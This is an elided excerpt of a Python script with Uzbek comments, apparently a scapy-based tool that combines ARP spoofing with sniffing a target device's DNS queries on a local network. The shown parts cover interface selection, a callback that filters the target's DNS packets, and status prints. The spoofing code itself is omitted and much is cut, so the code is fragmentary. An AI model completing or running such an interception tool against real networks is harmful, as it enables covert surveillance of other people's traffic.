...
# -*- coding: utf-8 -*-
"""
SUPER VERBOSE VERSION - DEBUG/TEST UCHUN
Barcha paketlarni ko'rish uchun
"""
...
# Verbose yoq, lekin debug uchun maximum ma'lumot
conf.verb = 0
...
class ARPSpoofingDNSSniffer:
    ...
    def select_interface(self):
        ...
        if not interfaces:
            ...
            manual_interface = input("🖱️  Interfeys nomi (masalan: wlan0, eth0): ").strip()
            if manual_interface:
                try:
    ...
    def packet_callback(self, packet):
        """Paketni qayta ishlash - SUPER VERBOSE"""
        try:
            self.total_packets += 1
            
            # Faqat nishon qurilmadan keladigan paketlarni ko'rish
            if IP in packet and packet[IP].src == self.target_ip:
                
                # Barcha UDP paketlarini ko'rish (debug uchun)
                if UDP in packet:
                    udp_packet = packet[UDP]
                    
                    # DNS paketlarini tekshirish (port 53)
                    if udp_packet.dport == 53 or udp_packet.sport == 53:
                        if DNS in packet:
                            dns_packet = packet[DNS]
                            
                            # DNS so'rovini tekshirish (qr=0)
                            if dns_packet.qr == 0:  # Query
                                try:
                                    # DNSQR (DNS Question Record) tekshirish
    ...
    def sniff_process(self):
        """DNS sniffing jarayoni - SUPER VERBOSE"""
        print("📊 DNS SNIFFING BOSHLANMOQDA")
        print("="*60)
        print("🌐 Nishon qurilmadan keladigan DNS so'rovlari:\n")
        print(f"🔍 Sniffer qilmoqda: {self.target_ip} dan UDP paketlar\n")
    ...
    def print_statistics(self):
        ...
        print(f"📡 Tutilgan JAMI UDP paketlar: {self.total_packets}")
    ...
    def run(self):
        """Asosiy dastur"""
        print("\n" + "="*70)
        print("🛡️  ARP SPOOFING VA DNS SNIFFER (SUPER VERBOSE)")
        print("="*70)
